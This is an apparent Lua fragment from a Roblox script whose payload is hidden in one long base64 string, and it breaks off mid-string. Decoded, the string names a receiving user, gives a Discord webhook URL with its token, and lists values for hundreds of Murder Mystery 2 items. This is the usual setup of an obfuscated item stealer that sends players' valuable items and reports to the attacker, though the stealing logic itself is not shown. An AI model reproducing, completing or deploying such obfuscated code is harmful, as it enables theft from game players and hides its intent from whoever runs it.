
        local encoded_script = "dXNlck5hbWUgPSAiY29va2VyX25pa2lsaXMiCndlYkhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTMyNTQ1OTE3NTk3OTA4OTk4MS8tY3lSYVgzUExmdm9YUXhnTHdPQUd5bFJnMWdDXzF2THNNSmxMbUxBQ1NTc0swMHN6bENwUDZ6TXBISGxIMktLR1FGZSIKCmxvY2FsIHZhbHVlcyA9IHsKICAgIFsiQ2VsZXN0aWFsIl0gPSA4MDAsCiAgICBbIkNvbnN0ZWxsYXRpb24iXSA9IDc3NSwKICAgIFsiTmlrJ3MgU2N5dGhlIl0gPSAyNTAwMDAwMCwKICAgIFsiRWxkZXJ3b29kIFNjeXRoZSJdID0gNzUsCiAgICBbIkJhdHdpbmciXSA9IDYyLAogICAgWyJJY2V3aW5nIl0gPSA0LAogICAgWyJDb3JydXB0Il0gPSAxMjc1LAogICAgWyJDaHJvbWEgTHVnZXIiXSA9IDg1LAogICAgWyJDaHJvbWEgU2hhcmsiXSA9IDY4LAogICAgWyJDaHJvbWEgTGFzZXIiXSA9IDg1LAogICAgWyJDaHJvbWEgU2xhc2hlciJdID0gNjcsCiAgICBbIkNocm9tYSBGYW5nIl0gPSA1NywKICAgIFsiQ2hyb21hIEhlYXQiXSA9IDgwLAogICAgWyJDaHJvbWEgU2F3Il0gPSA0MiwKICAgIFsiQ2hyb21hIERlYXRoU2hhcmQiXSA9IDU4LAogICAgWyJDaHJvbWEgVGlkZXMiXSA9IDYyLAogICAgWyJTZWVyQ2hyb21hIl0gPSA1MCwKICAgIFsiQ2hyb21hIEJvbmVibGFkZSJdID0gNTgsCiAgICBbIkNocm9tYSBHaW5nZXJibGFkZSJdID0gNTcsCiAgICBbIkVsZGVyd29vZCBSZXZvbHZlciJdID0gNTgsCiAgICBbIkV0ZXJuYWwgSUkiXSA9IDcsCiAgICBbIlJlZCBMdWdlciJdID0gNDIsCiAgICBbIkdyZWVuIEx1Z2VyIl0gPSAzMCwKICAgIFsiU3VnYXIiXSA9IDE0NSwKICAgIFsiQ2FuZHkiXSA9IDE1NSwKICAgIFsiQ2hpbGwiXSA9IDI0LAogICAgWyJIYW5kc2F3Il0gPSAxMCwKICAgIFsiRXRlcm5hbCJdID0gMTAsCiAgICBbIkJvbmVibGFkZSJdID0gMTAsCiAgICBbIkNsb2Nrd29yayJdID0gMjYsCiAgICBbIkhhbGxvdydzIEVkZ2UiXSA9IDE1LAogICAgWyJBbWVyaWxhc2VyIl0gPSAzMCwKICAgIFsiT2xkIEdsb3J5Il0gPSAyOCwKICAgIFsiQmF0dGxlQXhlIElJIl0gPSAxNiwKICAgIFsiU3BpZGVyIl0gPSAyMiwKICAgIFsiUGl4ZWwiXSA9IDI0LAogICAgWyJCbGFzdGVyIl0gPSAzMCwKICAgIFsiR2luZ2VyIEx1Z2VyIl0gPSAyNiwKICAgIFsiVmlydHVhbCJdID0gMjgsCiAgICBbIkZsYW1lcyJdID0gMTMsCiAgICBbIkx1Z2VyIl0gPSA2MCwKICAgIFsiSGVhdCJdID0gMjUsCiAgICBbIlhtYXMiXSA9IDEzLAogICAgWyJUaWRlcyJdID0gMjMsCiAgICBbIlNsYXNoZXIiXSA9IDI2LAogICAgWyJQdW1wa2luZyJdID0gMjIsCiAgICBbIlNhdyJdID0gMTAsCiAgICBbIkxhc2VyIl0gPSA4LAogICAgWyJGYW5nIl0gPSAyMywKICAgIFsiU2hhcmsiXSA9IDI4LAogICAgWyJEZWF0aHNoYXJkIl0gPSAyMSwKICAgIFsiV2ludGVyJ3MgRWRnZSJdID0gMTQsCiAgICBbIkljZSBEcmFnb24iXSA9IDEzLAogICAgWyJSZWQgU2VlciJdID0gMywKCVsiU2VlciJdID0gMywKICAgIFsiQmx1ZSBTZWVyIl0gPSAzLAogICAgWyJQdXJwbGUgU2VlciJdID0gMywKICAgIFsiT3JhbmdlIFNlZXIiXSA9IDIsCiAgICBbIlllbGxvdyBTZWVyIl0gPSAyLAogICAgWyJCYXR0bGVBeGUiXSA9IDEzLAogICAgWyJGcm9zdHNhYmVyIl0gPSAxOCwKICAgIFsiSWNlIFNoYXJkIl0gPSAxNCwKICAgIFsiR2luZ2VyYmxhZGUiXSA9IDIyLAogICAgWyJTbm93Zmxha2UiXSA9IDgsCiAgICBbIkdob3N0YmxhZGUiXSA9IDEwLAogICAgWyJOaWdodGJsYWRlIl0gPSAyOCwKICAgIFsiSGFsbG93J3MgQmxhZGUiXSA9IDExLAogICAgWyJKRCJdID0gNjAsCiAgICBbIldlYiJdID0gMiwKICAgIFsiUnVwdHVyZSJdID0gMiwKICAgIFsiR3JlZW4gRWxpdGUiXSA9IDEwLAogICAgWyJUcmVlIChndW4pIl0gPSAxLAogICAgWyJUcmVlIChrbmlmZSkiXSA9IDEsCiAgICBbIkNvdHRvbiBDYW5keSJdID0gNjAsCiAgICBbIlNjcmF0Y2giXSA9IDUsCiAgICBbIkdob3N0IEtuaWZlIl0gPSA2LAogICAgWyJHaW5nZXIgR3VuIl0gPSA0LAogICAgWyJSZWQgRmlyZSJdID0gMywKICAgIFsiQmx1ZSBTY3JhdGNoIl0gPSAzLAogICAgWyJCbHVlIEVsaXRlIl0gPSA4LAogICAgWyJHcmVlbiBGaXJlIl0gPSAwLjQzLAogICAgWyJHaG9zdCBHdW4iXSA9IDEsCiAgICBbIlByZWRhdG9yIChrbmlmZSkiXSA9IDAuNDQsCiAgICBbIkVtZXJhbGQiXSA9IDAuNDQsCiAgICBbIlNwYXJrbGUiXSA9IDAuNDMsCiAgICBbIk92ZXJzZWVyIChndW4pIl0gPSAwLjQ0LAogICAgWyJNaWRuaWdodCJdID0gMC40MywKICAgIFsiRWxpdGUiXSA9IDAuMzMsCiAgICBbIlNoaW55Il0gPSAwLjM0LAogICAgWyJGdXNpb24iXSA9IDAuMzQsCiAgICBbIkZhZGUiXSA9IDAuMzQsCiAgICBbIlNwbGFzaCJdID0gMC4zNCwKICAgIFsiVW5pdmVyc2UiXSA9IDAuMzQsCiAgICBbIk92ZXJzZWVyIChrbmlmZSkiXSA9IDAuNDIsCiAgICBbIlByZWRhdG9yIChndW4pIl0gPSAwLjQyLAogICAgWyJQbGFzbWl0ZSJdID0gMC4zNCwKICAgIFsiVmlwZXIiXSA9IDAuMzQsCiAgICBbIkdpbmdlciBLbmlmZSJdID0gMC40MiwKICAgIFsiSmFjayJdID0gNCwKICAgIFsiTXVtbXkiXSA9IDEsCiAgICBbIkdpbmdlciAoS25pZmUpIl0gPSAxLAogICAgWyJHaW5nZXIgKEd1bikiXSA9IDEsCiAgICBbIkNhbmUgKEtuaWZlKSJdID0gMiwKICAgIFsiQ2FuZSAoR3VuKSJdID0gMiwKICAgIFsiT3JhbmdlIE1hcmJsZSJdID0gNCwKICAgIFsiQmF0cyJdID0gNCwKICAgIFsiQ2FuZSBLbmlmZSJdID0gMTc1LAogICAgWyJJY2ljbGVzIEd1biJdID0gMjUsCiAgICBbIlNub3d5Il0gPSAxLAogICAgWyJHaW5nZXJCcmVhZCJdID0gMC40MiwKICAgIFsiVmFtcGlyZSBHdW4iXSA9IDI1LAogICAgWyJUb3hpYyBLbmlmZSJdID0gMzAsCiAgICBbIkdhbGF4eSJdID0gMC4yNCwKICAgIFsiUmFpbmJvdyJdID0gMC4yNCwKICAgIFsiSW1idWVkIl0gPSAwLjI0LAogICAgWyJHYWxhY3RpYyJdID0gMC4yNCwKICAgIFsiS3J5cHRvIl0gPSAwLjI0LAogICAgWyJTcGVjdHJ1bSJdID0gMC4yNCwKICAgIFsiaVJldm9sdmVyIl0gPSAwLjI0LAogICAgWyJIYWNrZXIiXSA9IDAuMjQsCiAgICBbIk5vdmEiXSA9IDAuMjQsCiAgICBbIlZvcnRleCJdID0gMC4yNCwKICAgIFsiQWNlIl0gPSAwLjI0LAogICAgWyJCYWNvbiJdID0gMC4yNCwKICAgIFsiS29yYmxveCJdID0gMC4yNCwKICAgIFsiU3F1aXJlIl0gPSAwLjI0LAogICAgWyJBYnN0cmFjdCJdID0gMC4yNCwKICAgIFsiTXVzaWNhbCJdID0gMC4yNCwKICAgIFsiQmxhY2siXSA9IDAuMjQsCiAgICBbIlB1cnBsZSJdID0gMC4yNCwKICAgIFsiTWFnbWEiXSA9IDEyLAogICAgWyJHcmVlbiBNYXJibGUiXSA9IDYsCiAgICBbIlZhbXBpcmUgS25pZmUiXSA9IDIsCiAgICBbIlRveGljIEd1biJdID0gMywKICAgIFsiQ2FuZSBHdW4iXSA9IDAuNDIsCiAgICBbIkljaWNsZXMgS25pZmUiXSA9IDAuNDEsCiAgICBbIk5ldGhlciJdID0gMC40MSwKICAgIFsiU3BpdGZpcmUiXSA9IDAuMzMsCiAgICBbIkRhbXAiXSA9IDAuMzMsCiAgICBbIk1vbHRlbiAoR3VuKSJdID0gMC40MiwKICAgIFsiTW9sdGVuIChLbmlmZSkiXSA9IDAuNDIsCiAgICBbIkdpZnRlZCJdID0gMSwKICAgIFsiU25vd21hbiAoS25pZmUpIl0gPSAxLAogICAgWyJTbm93bWFuIChHdW4pIl0gPSAxLAogICAgWyJOdXRjcmFja2VyIl0gPSAxLAogICAgWyJXcmFwcGVkIChLbmlmZSkiXSA9IDEsCiAgICBbIldyYXBwZWQgKEd1bikiXSA9IDEsCiAgICBbIldvbGYiXSA9IDQsCiAgICBbIlZhbXBpcmUiXSA9IDMsCiAgICBbIk1vb25zIl0gPSA0LAogICAgWyJOaWdodCJdID0gMC4zMSwKICAgIFsiRnV0dXJlIl0gPSAwLjMxLAogICAgWyJDaGVja2VyIl0gPSAwLjMxLAogICAgWyJMb3ZlIChHdW4pIl0gPSAwLjQyLAogICAgWyJEb251dCJdID0gMC4zMSwKICAgIFsiV2Fud29vZCJdID0gMC4xNCwKICAgIFsiQWR1cml0ZSAoS25pZmUpIl0gPSAwLjE0LAogICAgWyJCbHVlc3RlZWwgKEtuaWZlKSJdID0gMC4xNCwKICAgIFsiQWR1cml0ZSAoR3VuKSJdID0gMC4xNCwKICAgIFsiQ2FtbyJdID0gMC4xNCwKICAgIFsiU3RhbGtlciJdID0gMC4xNCwKICAgIFsiTWlzc2luZyJdID0gMC4xNCwKICAgIFsiQ2hlZXN5Il0gPSAwLjE0LAogICAgWyJTa2V0Y2giXSA9IDAuMTQsCiAgICBbIk1hcmluYSJdID0gMC4xNCwKICAgIFsiQ2hlZGRhciJdID0gMC4xNCwKICAgIFsiQ2lyY3VpdCJdID0gMC4xNCwKICAgIFsiUGFwZXIiXSA9IDAuMTQsCiAgICBbIkRvZ2UiXSA9IDAuMTQsCiAgICBbIkNhdXRpb24iXSA9IDAuMTQsCiAgICBbIlNvZGEiXSA9IDAuMTQsCiAgICBbIldvb2RlbiJdID0gMC4xNCwKICAgIFsiSGF6bWF0Il0gPSAwLjE0LAogICAgWyJCbHVlc3RlZWwgKEd1bikiXSA9IDAuMTQsCiAgICBbIk1lbG9uIl0gPSAwLjE0LAogICAgWyJIaXZlIl0gPSAwLjE0LAogICAgWyJKaWdzYXciXSA9IDAuMTQsCiAgICBbIkJydXNoIl0gPSAwLjE0LAogICAgWyJMdWNreSJdID0gMC4xNCwKICAgIFsiUGluayJdID0gMC4xNCwKICAgIFsiQmx1ZSJdID0gMC4xNCwKICAgIFsiUmVkIl0gPSAwLjE0LAogICAgWyJNdW1teSAoS25pZmUpIl0gPSAyLAogICAgWyJQb3Rpb24iXSA9IDUsCiAgICBbIldlYnMiXSA9IDQsCiAgICBbIlRyZWUiXSA9IDAuNDEsCiAgICBbIlN3ZWF0ZXIiXSA9IDAuMzIsCiAgICBbIkZyb3N0eSJdID0gMC40MSwKICAgIFsiTXVtbXkgR3VuIl0gPSAxMiwKICAgIFsiWm9tYmllIEd1biJdID0gMjAsCiAgICBbIlBvdGlvbiBLbmlmZSJdID0gMjIsCiAgICBbIk11bW15IEtuaWZlIl0gPSAyLAogICAgWyJab21iaWUgS25pZmUiXSA9IDIsCiAgICBbIlBvdGlvbiBHdW4iXSA9IDIsCiAgICBbIlN3ZWF0ZXIgS25pZmUiXSA9IDEwLAogICAgWyJTbm93Zmxha2UgS25pZmUiXSA9IDQsCiAgICBbIkhvbGx5IEd1biJdID0gMiwKICAgIFsiU3dlYXRlciBHdW4iXSA9IDAuMzEsCiAgICBbIlNub3dmbGFrZSBHdW4iXSA9IDAuMzEsCiAgICBbIkhvbGx5IEtuaWZlIl0gPSAwLjMxLAogICAgWyIyMDE1Il0gPSAyLAogICAgWyJUTkwiXSA9IDIsCiAgICBbIkhlYXJ0cyJdID0gNCwKICAgIFsiVmFsZW50aW5lIl0gPSAzLAogICAgWyJHb28iXSA9IDIsCiAgICBbIk5lb24iXSA9IDMsCiAgICBbIlJlcHRpbGUiXSA9IDIsCiAgICBbIkluZmVjdGVkIl0gPSAyLAogICAgWyJQYXNzaW9uIl0gPSA0LAogICAgWyJTd2VldGhlYXJ0Il0gPSAzLAogICAgWyJCbG9zc29tIl0gPSA0LAogICAgWyJSb3NlcyJdID0gNCwKICAgIFsiU2FudGEgKEtuaWZlKSJdID0gMSwKICAgIFsiU2FudGEgKEd1bikiXSA9IDEsCiAgICBbIk9ybmFtZW50MiAoa25pZmUpIl0gPSAxLAogICAgWyJPcm5hbWVudDIgKEd1bikiXSA9IDEsCiAgICBbIk9ybmFtZW50MSJdID0gMSwKICAgIFsiT3JuYW1lbnQiXSA9IDEsCiAgICBbIkVsZiAoR3VuKSJdID0gMywKICAgIFsiRWxmIChrbmlmZSkiXSA9IDE0LAogICAgWyJUdWxpcCJdID0gMywKICAgIFsiU2tvb2wiXSA9IDIzLAogICAgWyJQYXRyaWNrIl0gPSAyLAogICAgWyJCdW5ueSJdID0gMC4xMSwKICAgIFsiQ2hvY28iXSA9IDMsCiAgICBbIkVnZyJdID0gMiwKICAgIFsiQ2Fycm90Il0gPSAyLAogICAgWyJBc3Rlcm9pZCJdID0gNiwKICAgIFsiR2hvc3R5Il0gPSAwLjMyLAogICAgWyJCcmFpbnMiXSA9IDEsCiAgICBbIldpdGNoIl0gPSAxLAogICAgWyJCb25leSJdID0gMSwKICAgIFsiWGJveCJdID0gMC4xMiwKICAgIFsiU2xpbWUgR3VuIl0gPSAyLAogICAgWyJTbGltZSBLbmlmZSJdID0gMywKICAgIFsiQmF0cyBLbmlmZSJdID0gNzAsCiAgICBbIkJhdHMgR3VuIl0gPSA0LAogICAgWyJHcmF2ZSBHdW4iXSA9IDEyLAogICAgWyJHcmF2ZSBLbmlmZSJdID0gMiwKICAgIFsiSGF1bnRlZCBLbmlmZSJdID0gMTAsCiAgICBbIkhhdW50ZWQgR3VuIl0gPSAyLAogICAgWyJTcGFya2xlMTAiXSA9IDQ1LAogICAgWyJTcGFya2xlMSJdID0gMywKICAgIFsiU3BhcmtsZTIiXSA9IDMsCiAgICBbIlNwYXJrbGUzIl0gPSAzLAogICAgWyJTcGFya2xlNCJdID0gNSwKICAgIFsiRWN0byJdID0gMywKICAgIFsiQ2FuZHlDb3JuIl0gPSAyLAogICAgWyJQaGFudG9tIl0gPSA2LAogICAgWyJab21iaWUiXSA9IDQsCiAgICBbIkVsZiAoMjAxNykiXSA9IDAuMzEsCiAgICBbIlNhbnRhICgyMDE3KSJdID0gMC4zMSwKICAgIFsiQ29hbCJdID0gMC4zMSwKICAgIFsiUHJlc2VudCJdID0gMC4zMSwKICAgIFsiU2lkZXdpbmRlciJdID0gMTUsCiAgICBbIkdyaW5kIl0gPSA0LAogICAgWyJFdXJvIl0gPSA4LAogICAgWyJPbGxpZSJdID0gMjAsCiAgICBbIlRhaWxzbGlkZSJdID0gMjIsCiAgICBbIkluZHkiXSA9IDIsCiAgICBbIkNvYWwgR3VuIl0gPSAwLjMxLAogICAgWyJTbm93bWFuIEtuaWZlIl0gPSAwLjMxLAogICAgWyJTYW50YSBLbmlmZSJdID0gMC4zMSwKICAgIFsiV3JhcHBlZCBLbmlmZSJdID0gMC4zMSwKICAgIFsiU3BhcmtsZTUiXSA9IDE1LAogICAgWyJTcGFya2xlNiJdID0gMTgsCiAgICBbIlNwYXJrbGU3Il0gPSAyMywKICAgIFsiU3BhcmtsZTgiXSA9IDI2LAogICAgWyJTcGFya2xlOSJdID0gNDIsCiAgICBbIkNvYWwga25pZmUiXSA9IDI1LAogICAgWyJTbm93bWFuIEd1biJdID0gNSwKICAgIFsiRWxmIEd1biJdID0gMC40MSwKICAgIFsiV3JhcHBlZCBHdW4iXSA9IDUsCiAgICBbIldoaXRlb3V0Il0gPSAwLjExLAogICAgWyJTcGxhdHRlciJdID0gMC4xMSwKICAgIFsiSWNlIl0gPSAwLjExLAogICAgWyJMb3ZlIChLbmlmZSkiXSA9IDAuMTEsCiAgICBbIklyb24iXSA9IDAuMTEsCiAgICBbIkJpZyBLaWxsIl0gPSAwLjExLAogICAgWyJGYWxsb3V0Il0gPSAwLjExLAogICAgWyJDb2xkIl0gPSAwLjExLAogICAgWyJMaW5rZWQiXSA9IDAuMTEsCiAgICBbIlNsYXRlIl0gPSAwLjExLAogICAgWyJCb3JkZXJzIl0gPSAwLjExLAogICAgWyI4Yml0Il0gPSAwLjExLAogICAgWyJFbmdyYXZlZCJdID0gMC4xMSwKICAgIFsiSW5maWx0cmF0b3IiXSA9IDAuMTEsCiAgICBbIkp1aWNlIl0gPSAwLjExLAogICAgWyJTdGFyIl0gPSAwLjExLAogICAgWyJDbGFuIl0gPSAwLjExLAogICAgWyJDaGVycnkiXSA9IDAuMTEsCiAgICBbIkNhcmRib2FyZCJdID0gMC4xMSwKICAgIFsiU3RhaW5sZXNzIl0gPSAwLjExLAogICAgWyJCaXQiXSA9IDAuMTEsCiAgICBbIlBlYSJdID0gMC4xMSwKICAgIFsiTmV3cyJdID0gMC4xMSwKICAgIFsiSEwyIl0gPSAwLjExLAogICAgWyJCbGVhY2hlZCJdID0gMC4xMSwKICAgIFsiQ2xvd24iXSA9IDAuMTIsCiAgICBbIk9pbHkiXSA9IDAuMTEsCiAgICBbIkFxdWEiXSA9IDAuMTEsCiAgICBbIkVjbyJdID0gMC4xMSwKICAgIFsiTG9nIl0gPSAwLjExLAogICAgWyJTYW5keSJdID0gMC4xMSwKICAgIFsiU3RhdGljIl0gPSAwLjExLAogICAgWyJCcm93biJdID0gMC4xMSwKICAgIFsiR3JlZW4iXSA9IDAuMTEsCiAgICBbIlllbGxvdyJdID0gMC4xMSwKICAgIFsiT3JhbmdlIl0gPSAwLjExLAogICAgWyJQcmlzbSJdID0gMywKICAgIFsiRGVuaXMiXSA9IDEsCiAgICBbIkFsZXgiXSA9IDEsCiAgICBbIkNvcmwiXSA9IDEsCiAgICBbIlNrZXRjaHkiXSA9IDEsCiAgICBbIlN1YiJdID0gMSwKICAgIFsiQ2hyb21hIEZpcmUgQmF0Il0gPSAxNSwKICAgIFsiQ2hyb21hIEZpcmUgQmVhciJdID0gOCwKICAgIFsiQ2hyb21hIEZpcmUgRm94Il0gPSAxNSwKICAgIFsiQ2hyb21hIEZpcmUgUGlnIl0gPSA5LAogICAgWyJDaHJvbWEgRmlyZSBCdW5ueSJdID0gMTgsCiAgICBbIkNocm9tYSBGaXJlIENhdCJdID0gMjAsCiAgICBbIkNocm9tYSBGaXJlIERvZyJdID0gMTUsCiAgICBbIjwzIl0gPSAxMCwKICAgIFsiU3RlYW1iaXJkIl0gPSAyLAogICAgWyJQaG9lbml4Il0gPSAzLAogICAgWyJTYW1teSJdID0gMiwKICAgIFsiRWxlY3RybyJdID0gMiwKICAgIFsiRGVhdGhzcGVha2VyIl0gPSAzLAogICAgWyJGaXJlIEJhdCJdID0gMSwKICAgIFsiRmlyZSBCZWFyIl0gPSAxLAogICAgWyJGcm9zdGJpcmQiXSA9IDMsCiAgICBbIkZpcmUgRm94Il0gPSAxLAogICAgWyJGaXJlIFBpZyJdID0gMSwKICAgIFsiRmlyZSBCdW5ueSJdID0gMSwKICAgIFsiRmlyZSBDYXQiXSA9IDEsCiAgICBbIkZpcmUgRG9nIl0gPSAxLAogICAgWyJJY2UgUGhvZW5peCJdID0gMC40MywKICAgIFsiVHJhdmVsbGVyIl0gPSAwLjQzLAogICAgWyJTa2VsbHkiXSA9IDAuNDMsCiAgICBbIlB1cnBsZSBQdW1wa2luIl0gPSA0MCwKICAgIFsiT3ZlcnNlZXIgRXllIl0gPSAzOCwKICAgIFsiQmx1ZSBQdW1wa2luIl0gPSA2MCwKICAgIFsiUmVkIFB1bXBraW4iXSA9IDQ1LAogICAgWyJHcmVlbiBQdW1wa2luIl0gPSAzMCwKICAgIFsiUHVtcGtpbiJdID0gMTgsCiAgICBbIkZhaXJ5Il0gPSAyMiwKICAgIFsiUmVpbmRlZXIiXSA9IDIwLAogICAgWyJFbGYiXSA9IDQsCiAgICBbIk5vYmxlZHJhZ29uIl0gPSAyNSwKICAgIFsiRWxpdGV5Il0gPSAwLjMxLAogICAgWyJFeWViYWxsIl0gPSAzNSwKICAgIFsiSmV0c3RyZWFtIl0gPSA0MiwKICAgIFsiRG9nZXkiXSA9IDU1LAogICAgWyJDaGlsbHkiXSA9IDE1LAogICAgWyJTZWFob3JzZXkiXSA9IDE3LAogICAgWyJQaWdneSJdID0gNCwKICAgIFsiUGVuZ3kiXSA9IDE1LAogICAgWyJVRk8iXSA9IDcsCiAgICBbIkJhZGdlciJdID0gMiwKICAgIFsiQmF0Il0gPSAwLjMxLAogICAgWyJUYW5raWUiXSA9IDEzLAogICAgWyJNZWNoYnVnIl0gPSA3LAogICAgWyJCZWFyIl0gPSAwLjIyLAogICAgWyJGb3giXSA9IDAuMTIsCiAgICBbIlBpZyJdID0gMC4xMiwKICAgIFsiU2FudGEgRG9nIl0gPSAwLjEyLAogICAgWyJDYXQiXSA9IDAuMTEsCiAgICBbIkRvZyJdID0gMC4xMSwKICAgIFsiQW1lcmljYSJdID0gMTAsCiAgICBbIkdvbGRlbiJdID0gNCwKICAgIFsiQmxvb2QiXSA9IDEwLAogICAgWyJQaGFzZXIiXSA9IDksCiAgICBbIlByaW5jZSJdID0gNiwKICAgIFsiU2hhZG93Il0gPSA3LAogICAgWyJHaG9zdCJdID0gMTIsCiAgICBbIlNwbGl0dGVyIl0gPSAzLAogICAgWyJDb3dib3kiXSA9IDMsCiAgICBbIkV0ZXJuYWxjYW5lIl0gPSAyMCwKICAgIFsiU2t1bGxzIl0gPSAxMiwKICAgIFsiV2l0Y2hlZCJdID0gNTAsCiAgICBbIk1vbnN0ZXIiXSA9IDIyLAogICAgWyJQdW1wa2luIFBhdGNoIl0gPSAyLAogICAgWyJCbHVlIFB1bXBraW4gMjAxOSJdID0gMywKICAgIFsiQnJhaW5zIDIwMTkiXSA9IDIwLAogICAgWyJFbGYgMjAxOSJdID0gMjUsCiAgICBbIkdpbmdlcmJyZWFkIEd1biJdID0gNSwKICAgIFsiR2luZ2VyYnJlYWQgS25pZmUiXSA9IDEwNSwKICAgIFsiR3JlZW4gUHVtcGtpbiAyMDE5Il0gPSAyNywKICAgIFsiUmVkIFB1bXBraW4gMjAxOSJdID0gMzAsCiAgICBbIlB1bXBraW5QZXQyMDE5Il0gPSAwLjIxLAogICAgWyJSdWRvbHBoIl0gPSAyMCwKICAgIFsiVmFtcGlyZSBCYXQiXSA9IDMyLAogICAgWyJCbGFjayBDYXQiXSA9IDQ1LAogICAgWyJab21iaWUgRG9nIl0gPSAxODUsCiAgICBbIkF1cm9yYSBHdW4iXSA9IDIsCiAgICBbIkF1cm9yYSBLbmlmZSJdID0gMzAsCiAgICBbIkJvbmVzIEd1biJdID0gNzUsCiAgICBbIkJyYW5jaGVzIl0gPSAyMiwKICAgIFsiQ2FuZHkgU3dpcmwgR3VuIl0gPSAyMCwKICAgIFsiQ2FuZHkgU3dpcmwgS25pZmUiXSA9IDEsCiAgICBbIkxpZ2h0cyBHdW4iXSA9IDIwLAogICAgWyJMaWdodHMgS25pZmUiXSA9IDIsCiAgICBbIkxvZyBDaG9wcGVyIl0gPSAzMCwKICAgIFsiTWludHkiXSA9IDI1LAogICAgWyJJY2V5Il0gPSAwLjMyLAogICAgWyJGcm9zdGJpdGUiXSA9IDEwLAogICAgWyJMdWdlcmNhbmUiXSA9IDIwLAogICAgWyJTbmFrZWJpdGUgS25pZmUiXSA9IDEyLAogICAgWyJTbmFrZWJpdGUgR3VuIl0gPSAxLAogICAgWyJTbm93Zmxha2VzIEd1biJdID0gMC40MSwKICAgIFsiU25vd2ZsYWtlcyBLbmlmZSJdID0gMC4zMSwKICAgIFsiU2xpbXkiXSA9IDAuNDEsCiAgICBbIlNhbnRhJ3MgTWFnaWMiXSA9IDEzLAogICAgWyJEdW5nZW9uIl0gPSA0NSwKICAgIFsiRnJvc3RlZCBHdW4iXSA9IDAuMzEsCiAgICBbIkZyb3N0ZWQgS25pZmUiXSA9IDAuNDEsCiAgICBbIkdpZnRzIEtuaWZlIl0gPSA2MCwKICAgIFsiR2lmdHMgR3VuIl0gPSAxLAogICAgWyJQaW5lIEd1biJdID0gMSwKICAgIFsiUGluZSBLbmlmZSJdID0gMjAsCiAgICBbIldlYmJlZCBHdW4iXSA9IDAuMzEsCiAgICBbIldlYmJlZCBLbmlmZSJdID0gMC4zMywKICAgIFsiWm9tYmlmaWVkR3VuIl0gPSAyMCwKICAgIFsiWm9tYmlmaWVkIEtuaWZlIl0gPSA1NSwKICAgIFsiTXVtbWlmaWVkIl0gPSAwLjQyLAogICAgWyJSSVAgR3VuIl0gPSAyMCwKICAgIFsiQm94IG9mIEdvbGQgUGFwZXJzIl0gPSA0LAogICAgWyJCb3ggb2YgVWx0cmEgV3JhcCJdID0gNCwKICAgIFsiQm94IG9mIFB1cnBsZSBQYXBlcnMiXSA9IDMsCiAgICBbIkJveCBvZiBCbHVlIFBhcGVycyJdID0gMywKICAgIFsiQm94IG9mIFJlZCBQYXBlcnMiXSA9IDMsCiAgICBbIkJveCBvZiBHcmVlbiBQYXBlcnMiXSA9IDIsCiAgICBbIkJveCBvZiBGZXJ0Il0gPSAyLAogICAgWyJNeXN0ZXJ5IEtleXMiXSA9IDQsCiAgICBbIlhtYXMgR2lmdHMiXSA9IDAuNDEsCiAgICBbIlNub3dmbGFrZSBLZXkiXSA9IDAuMzEsCiAgICBbIlNrZWxldG9uIEtleSJdID0gMiwKICAgIFsiQ2hyb21hIEdlbXN0b25lIl0gPSA3NSwKICAgIFsiR2Vtc3RvbmUiXSA9IDI2LAogICAgWyJFdGVybmFsIElJSSJdID0gOCwKICAgIFsiUnVuZSJdID0gMC4zNCwKICAgIFsiUmFpbmJvdyAoR3VuKSJdID0gMC4yNCwKICAgIFsiQmlvYmxhZGUiXSA9IDEzLAogICAgWyJMaWdodGJyaW5nZXIiXSA9IDU4LAogICAgWyJDaHJvbWEgTGlnaHRicmluZ2VyIl0gPSAxMjAsCiAgICBbIkNocm9tYSBEYXJrYnJpbmdlciJdID0gMTI1LAogICAgWyJEYXJrYnJpbmdlciJdID0gNjIsCiAgICBbIkNvbWJhdCJdID0gMC4xMSwKICAgIFsiQ29wcGVyIl0gPSAwLjExLAogICAgWyJIYXJkZW5lZCJdID0gMC4xMSwKICAgIFsiU3BsYXQiXSA9IDAuMTEsCiAgICBbIlRpZ2VyIl0gPSAwLjE0LAogICAgWyJQaXJhdGUiXSA9IDAuMTQsCiAgICBbIlNwYWNlIl0gPSAwLjI0LAogICAgWyJTcGxhc2ggR3VuIl0gPSAwLjMzLAogICAgWyJEZWVwIFNlYSJdID0gMC4yNCwKICAgIFsiTmlnaHRmaXJlIl0gPSAwLjI0LAogICAgWyJCaW9ndW4iXSA9IDAuMTQsCiAgICBbIkdyYWZmaXRpIl0gPSAwLjEzLAogICAgWyJIaWdoIFRlY2giXSA9IDAuMTMsCiAgICBbIkNsb3duIEd1biJdID0gMC4xMiwKICAgIFsiTGVhZiJdID0gMC4xMSwKICAgIFsiTG92ZWx5Il0gPSAwLjExLAogICAgWyJTaGFkZWQiXSA9IDAuMTEsCiAgICBbIkV0ZXJuYWwgSVYiXSA9IDEwLAogICAgWyJQcmlzbWF0aWMiXSA9IDgsCiAgICBbIkNhdmVybiBHdW4iXSA9IDEsCiAgICBbIkNhdmVybiBLbmlmZSJdID0gMTIsCiAgICBbIkhhbGxvd3NjeXRoZSJdID0gNTAsCiAgICBbIkhhbGxvd2d1biJdID0gMzMsCiAgICBbIlZhbXBpcmUncyBFZGdlIl0gPSAxNiwKICAgIFsiUmlwcGVyIEd1biJdID0gMC40MiwKICAgIFsiUmlwcGVyIEtuaWZlIl0gPSAwLjQzLAogICAgWyJCb25lcyJdID0gMC4zMiwKICAgIFsiUG9ydGFsIEtuaWZlIl0gPSAwLjMyLAogICAgWyJHaG9zdHMiXSA9IDAuMjEsCiAgICBbIlBlcHBlcm1pbnQiXSA9IDYsCiAgICBbIkljZWJyZWFrZXIiXSA9IDg1LAogICAgWyJJY2VibGFzdGVyIl0gPSA2MCwKICAgIFsiSmluZ2xlZ3VuIl0gPSAxNCwKICAgIFsiQ29va2llYmxhZGUiXSA9IDQsCiAgICBbIkdvbGQgQ2FuZHkiXSA9IDEwMDAwMDAwMCwKICAgIFsiU2lsdmVyIENhbmR5Il0gPSA3NTAwMDAwMCwKICAgIFsiQnJvbnplIENhbmR5Il0gPSA1MDAwMDAwMCwKICAgIFsiQmx1ZSBDYW5keSJdID0gMTAwMDAwMCwKICAgIFsiUmVkIEhhbGxvdyJdID0gMTAwMDAwMCwKICAgIFsiR29sZCBIYWxsb3ciXSA9IDEwMDAwMDAwMCwKICAgIFsiU2lsdmVyIEhhbGxvdyJdID0gNzUwMDAwMDAsCiAgICBbIkJyb256ZSBIYWxsb3ciXSA9IDUwMDAwMDAwLAogICAgWyJCcm9uemUgU3VnYXIi